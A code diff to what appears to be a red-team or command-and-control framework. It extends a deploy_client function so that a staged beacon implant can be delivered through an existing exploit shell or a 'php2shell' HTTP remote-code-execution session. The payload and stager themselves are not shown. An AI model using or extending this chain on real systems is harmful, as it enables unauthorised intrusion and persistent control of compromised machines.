@@ -1405,11 +1405,14 @@ def deploy_client(
     wait: float = DEPLOY_WAIT_DEFAULT_S,
     config: BofDeliveryConfig | None = None,
     payload: dict[str, Any] | None = None,
+    session: Any | None = None,
 ) -> dict[str, Any]:
     """Deliver a staged beacon client onto a target and await check-in.
 
     The target must already expose an exec-capable shell session from the
-    atomic exploit bridge (see ``atomic_exploit run`` / ``atomic_shell``).
+    atomic exploit bridge (see ``atomic_exploit run`` / ``atomic_shell``),
+    or the caller must pass one with the ``session`` override (a
+    ``alive()``/``run()`` adapter such as the php2shell HTTP RCE session).
     Delivery walks a fallback chain and stops on the first check-in:
 
     1. Upstream diskless stager — token-gated ``/stage/`` endpoints, the
@@ -1427,6 +1430,10 @@ def deploy_client(
         wait: Seconds to wait for the first beacon check-in.
         config: Optional delivery configuration override.
         payload: Optional payload.json mapping override (tests).
+        session: Optional pre-opened session adapter exposing
+            ``run(command, timeout)``; when given it replaces the atomic
+            bridge session lookup so HTTP RCE footholds (php2shell) can
+            receive the beacon without a bind shell.
 
     Returns:
         ``{success, client_id, reason, deployed, attempts}`` where
@@ -1465,11 +1472,11 @@ def deploy_client(
     client_id = str(data.get("beacon_client_id", "") or _DEFAULT_BEACON_CLIENT_ID).strip() or _DEFAULT_BEACON_CLIENT_ID
     paths = _deploy_paths(addon)
     stage_payload_b64 = _stage_payload_b64()
-    session = _atomic_session(target)
+    session = session if session is not None else _atomic_session(target)
     if session is None:
         return {
             "success": False,
-            "reason": f"no exec session on {target}: open one with atomic_exploit run or atomic_shell",
+            "reason": f"no exec session on {target}: open one with atomic_exploit run, atomic_shell or a php2shell RCE session",
             "client_id": "",
             "deployed": False,
         }
